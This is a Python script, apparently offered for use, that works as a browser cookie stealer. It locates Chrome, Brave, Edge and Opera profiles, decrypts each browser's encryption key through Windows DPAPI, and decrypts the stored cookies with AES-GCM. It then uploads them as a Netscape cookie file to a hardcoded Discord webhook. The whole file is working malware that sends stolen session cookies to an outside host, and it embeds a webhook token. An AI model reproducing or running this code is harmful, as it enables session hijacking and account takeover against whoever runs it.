import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import requests
import ctypes
from datetime import datetime, timedelta
from Crypto.Cipher import AES

def get_encryption_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
    except Exception as e:
        print(f"Error al obtener la clave de cifrado: {e}")
        return None

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except Exception as e:
        print(f"Error al descifrar la data: {e}")
        return ""

def extract_cookies(cookies_path, key):
    if not os.path.exists(cookies_path):
        print(f"Ruta de cookies no encontrada: {cookies_path}")
        return []

    temp_cookies_path = 'temp_cookies'
    shutil.copyfile(cookies_path, temp_cookies_path)

    conn = sqlite3.connect(temp_cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value, creation_utc, last_access_utc, expires_utc FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    os.remove(temp_cookies_path)

    cookie_list = []
    for host_key, name, encrypted_value, creation_utc, last_access_utc, expires_utc in cookies:
        decrypted_value = decrypt_data(encrypted_value, key)
        if decrypted_value:
            cookie_list.append((host_key, name, decrypted_value, creation_utc, last_access_utc, expires_utc))
    return cookie_list

def save_cookies_to_netscape(cookies):
    netscape_content = "# Netscape HTTP Cookie File\n"
    for host_key, name, value, creation_utc, last_access_utc, expires_utc in cookies:
        netscape_content += f"{host_key}\tTRUE\t/\tFALSE\t{int(expires_utc / 1000000)}\t{name}\t{value}\n"
    return netscape_content

def main():
    webhook_url = "https://discord.com/api/webhooks/1301993912688312401/kjDKkVlv8txbIE9zdNF0NWk1XUFkOserHlCbJc73tkhcoySJaYy9LIqmc_lqoGNmGmal"
    browsers = {
        'Google\\Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
        'BraveSoftware\\Brave-Browser': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Microsoft\\Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
        'Opera Software\\Opera GX Stable': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable'),
        'Opera Software\\Opera Stable': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable')
    }

    for browser_name, base_path in browsers.items():
        if not os.path.exists(base_path):
            continue

        for profile in os.listdir(base_path):
            profile_path = os.path.join(base_path, profile)
            cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
            local_state_path = os.path.join(profile_path, 'Local State')

            if not os.path.exists(cookies_path) or not os.path.exists(local_state_path):
                continue

            key = get_encryption_key(local_state_path)
            if not key:
                print(f"Clave de cifrado no encontrada para {profile} en {browser_name}")
                continue

            cookies = extract_cookies(cookies_path, key)
            netscape_content = save_cookies_to_netscape(cookies)

            # Enviar cookies a Discord
            data = {"content": f"**Browser** : {browser_name} - {profile}\n"}
            files = {'cookies.txt': ('cookies.txt', netscape_content)}

            response = requests.post(webhook_url, data=data, files=files)
            if response.status_code != 204:
                print(f"Error al enviar datos a Discord para {browser_name} - {profile}: {response.status_code}")

if __name__ == "__main__":
    main()
